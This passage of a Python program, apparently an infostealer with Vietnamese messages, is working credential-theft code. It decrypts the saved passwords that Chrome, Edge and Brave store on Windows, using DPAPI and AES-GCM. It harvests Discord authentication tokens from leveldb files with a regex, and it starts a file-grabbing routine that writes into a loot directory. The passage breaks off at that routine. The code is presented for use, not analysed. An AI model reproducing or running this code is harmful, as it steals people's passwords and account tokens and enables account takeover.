          def _dpapi(blob):
              import ctypes
              from ctypes import wintypes
              class BLOB(ctypes.Structure):
                  _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
              buf = ctypes.create_string_buffer(blob, len(blob))
              bi = BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
              bo = BLOB()
              if not ctypes.windll.crypt32.CryptUnprotectData(
                      ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
                  return b""
              out = ctypes.string_at(bo.pbData, bo.cbData)
              ctypes.windll.kernel32.LocalFree(bo.pbData)
              return out

          def _browsers():
              local = os.environ.get("LOCALAPPDATA", "")
              return [("Chrome", os.path.join(local, r"Google\Chrome\User Data")),
                      ("Edge",   os.path.join(local, r"Microsoft\Edge\User Data")),
                      ("Brave",  os.path.join(local, r"BraveSoftware\Brave-Browser\User Data"))]

          def f_browser():
              try:
                  from Crypto.Cipher import AES
              except Exception:
                  return "Thiếu pycryptodome"
              import sqlite3
              lines = []
              for name, base in _browsers():
                  ls = os.path.join(base, "Local State")
                  if not os.path.exists(ls): continue
                  try:
                      key = _dpapi(base64.b64decode(
                          json.load(open(ls, encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:])
                  except Exception: continue
                  for prof in os.listdir(base):
                      db = os.path.join(base, prof, "Login Data")
                      if not os.path.exists(db): continue
                      tmp = os.path.join(tempfile.gettempdir(), "ld_" + prof + ".db")
                      try: shutil.copy2(db, tmp)
                      except Exception: continue
                      try:
                          con = sqlite3.connect(tmp); cur = con.cursor()
                          cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                          for url, user, pw in cur.fetchall():
                              if not pw: continue
                              try:
                                  if pw[:3] == b"v10":
                                      d = AES.new(key, AES.MODE_GCM, pw[3:15]).decrypt(pw[15:])[:-16].decode("utf-8", "ignore")
                                  else:
                                      d = _dpapi(pw).decode("utf-8", "ignore")
                              except Exception: d = "(?)"
                              lines.append(f"[{name}/{prof}] {url} | {user} | {d}")
                          con.close()
                      except Exception: pass
              return "\n".join(lines[:300]) or "Không đọc được mật khẩu"

          def f_discord():
              roots = [os.path.join(os.environ.get("APPDATA",""), x) for x in
                       ("discord","discordcanary","discordptb")]
              roots += [os.path.join(os.environ.get("LOCALAPPDATA",""), r"Google\Chrome\User Data"),
                        os.path.join(os.environ.get("LOCALAPPDATA",""), r"Microsoft\Edge\User Data"),
                        os.path.join(os.environ.get("LOCALAPPDATA",""), r"BraveSoftware\Brave-Browser\User Data")]
              pat = re.compile(r"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}")
              res = []
              for r in roots:
                  if not os.path.isdir(r): continue
                  for dp, dn, fn in os.walk(r):
                      if "leveldb" not in dp.lower(): continue
                      for f in fn:
                          if f.endswith((".ldb",".log")):
                              try:
                                  data = open(os.path.join(dp,f), "r", errors="ignore").read()
                                  for m in pat.findall(data):
                                      if m not in res: res.append(m)
                              except Exception: pass
              return "\n".join(res) or "Không tìm thấy token"

          def f_grab():
              gdir = os.path.join(LOOT_DIR, "grab")
              shutil.rmtree(gdir, ignore_errors=True); os.makedirs(gdir, exist_ok=True)
